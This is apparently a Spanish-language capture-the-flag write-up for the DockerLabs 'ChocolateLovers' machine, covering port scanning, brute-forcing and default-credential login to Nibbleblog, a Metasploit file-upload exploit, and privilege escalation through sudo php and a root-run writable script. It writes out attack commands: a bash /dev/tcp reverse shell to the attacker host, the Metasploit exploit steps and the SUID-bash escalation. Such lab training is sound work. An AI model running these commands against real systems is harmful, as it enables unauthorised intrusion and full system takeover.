# Máquina ChocolateLovers

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

Echamos un vistazo a la web y vemos que es la página por defecto de apache. Aplicamos **fuzzing** pero no encontramos absolutamente nada.

Mirando el código de la página encontramos un comentario con un directorio **/nibbleblog**.

![Pasted image 20240508131640](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/d579f63d-7182-4917-8c89-a9986337945f)

Al acceder encontramos efectivamente una página que emplea esta tecnología.

![Pasted image 20240507224317](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/b6af0b9a-2ad1-4074-b2a1-662cef891586)

Vemos que hay una ruta a un panel de administración. Accedemos y encontramos un panel de login:

![Pasted image 20240507224342](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/b628c352-0beb-4b35-b3af-c151231121a2)

--------------
## Explotación

Probaremos a hacer **fuerza bruta** contra este panel de login. Podemos emplear la herramienta **hydra**.
Vemos que data se tramita al hacer una prueba de login:

![Pasted image 20240507224909](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/2141b791-afd6-410e-a3ce-80f25c25be4a)

Usaremos la Request para indicarle a **hydra** la petición y el mensaje de error para que sepa cuando no ha sido exitoso el login.

```shell
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt "http-post-form://172.17.0.2/nibbleblog/admin.php:username=^USER^&password=^PASS^:Invalid username or password"
```

![Pasted image 20240507225348](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/16faeef0-e71a-4e0e-9fbf-8f745c92965a)

Vemos que reporta un montón de falsos positivos y tras volver a la página vemos un mensaje de error. Esto corresponderá seguramente a alguna protección contra fuerza bruta.

![Pasted image 20240507225902](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/31c2a20c-c33d-4175-a852-4c94a899d864)

Finalmente, bastaba con probar a loguearte con las credenciales más típicas -> **admin:admin**

Logramos acceder al panel de administración del blog. En ajustes (settings), podemos ver la versión del **nibleblog**:

![Pasted image 20240507231204](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/c9ecad54-520e-4015-a43c-df99f680b7e9)

Si buscamos con **searchsploit** hay un exploit específico para esa versión.

![Pasted image 20240507231234](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/8932e550-af8b-42f5-9c20-a00af2dec069)

```shell
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set PASSWORD admin
set USERNAME admin
set RHOSTS 172.17.0.2
set TARGETURI /nibbleblog/
exploit
```

Al ejecutar el exploit vemos que nos da error:

![Pasted image 20240507233147](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/fe48beed-cf37-40ab-aa88-6168dd7c5b54)

Revisando el código del script que estamos explotando, está abusando de un plugin llamado **My Image**.
Vemos en la sección de plugins del panel que no está instalado. Lo instalamos.

![Pasted image 20240507233237](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/ef3e6d5a-31af-4f0a-ac97-d54b348b8a76)

Con esto obtenemos una sesión de meterpreter exitosamente.

![Pasted image 20240507233314](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/59e5d847-d717-45d7-8807-c635cef702e0)

Estamos dentro !

Ponemos **shell** para tener una consola a la que estamos acostumbrados.

Nos ponemos en escucha y nos enviamos una reverse shell para trabajar de forma más cómoda:

![Pasted image 20240507233658](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/a6002ce2-ce9a-44ce-b636-ff78a9ffcd91)

```shell
sudo nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/172.17.0.1/443 0>&1" 
```

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

------------
## Escalada de privilegios

Hacemos **sudo -l** y vemos que podemos ejecutar **php** como el usuario **chocolate**:

```shell
sudo -l
-----------------------------------------------------------------
User www-data may run the following commands on 9098e8d027e9:
    (chocolate) NOPASSWD: /usr/bin/php
```

Abusamos de este:

```shell
CMD="/bin/bash"
sudo -u chocolate /usr/bin/php -r "system('$CMD');"
```

Si listamos los procesos que están corriendo en el sistema. Podemos ver que **root** está ejecutando un script sospechoso:

```shell
ps -faux
----------------------------
root   1  0.0  0.0   2616  1712 ?   Ss   13:15   0:00 /bin/sh -c service apache2 start && while true; do php /opt/script.php; sleep 5; done
```

Si listamos sus permisos vemos que pertenece al usuario **chocolate**:

```shell
ls -l /opt/script.php
------------------------------
-rw-r--r-- 1 chocolate chocolate 59 May  7 13:55 /opt/script.php
```

Podremos cambiarlo a nuestro antojo para ejecutar algo como el usuario **root**:

```shell
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

Y tras esperar un poco:

```shell
ls -l /bin/bash
----------------------------
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Vemos que la bash ya es **SUID** por lo que podemos escalar privilegios.

```shell
bash -p
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema!
